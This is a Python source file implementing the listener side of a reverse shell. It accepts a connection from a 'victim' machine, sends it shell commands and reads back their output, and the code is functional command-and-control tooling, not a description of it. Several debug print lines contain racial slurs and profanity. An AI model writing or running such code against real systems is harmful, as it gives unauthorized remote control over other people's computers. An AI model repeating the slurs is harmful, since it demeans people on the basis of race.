import socket

conEST = False

def listen(ip: str, port: int, connectionLimit, q, listenermessage, conQ):
    try:
        global conEST
        listenermessage.put(f'Listener started on {ip}:{port}')
        if connectionLimit != int:
            connectionLimit = 1
        print(port)
        server = socket.socket()
        server.setsockopt(socket.SOL_SOCKET, socket.SO_RCVTIMEO, 10)
        server.bind((ip, port))
        server.listen(connectionLimit)
        victim, victim_address = server.accept()
        conEST = True
        conQ.put(True)

        q.put((victim, victim_address))
    except Exception as e:
        print(e)


def sendCommand(command: str, q, commandQ, errorQ):
    try:
        if conEST == True:
            print("hfdsiafadf ngiger")

            victim, victim_address = q.get()
            q.put((victim, victim_address))
            print("shit")
            customOutput = ''
            if len(command) < 1:
                customOutput = "Command cannot be null"
                command = 'cd'
            if command == 'say' or command == 'python':
                customOutput = 'Command cancelled because the written command breaks connection.'
                command = 'cd'

            print("shitting nigger")
            victim.send(command.encode())
            print("nigger")
            victim.settimeout(5.0)
            output = victim.recv(1000000000).decode()
            commandQ.put(output)
            errorQ.put(customOutput)
        else:
            customOutput = 'Command cannot be sent because there is no active connection with victim.'
            commandQ.put((customOutput))
    except Exception as ex:
        if type(ex) == AttributeError:
            print("No victim is connected")
        print(ex)
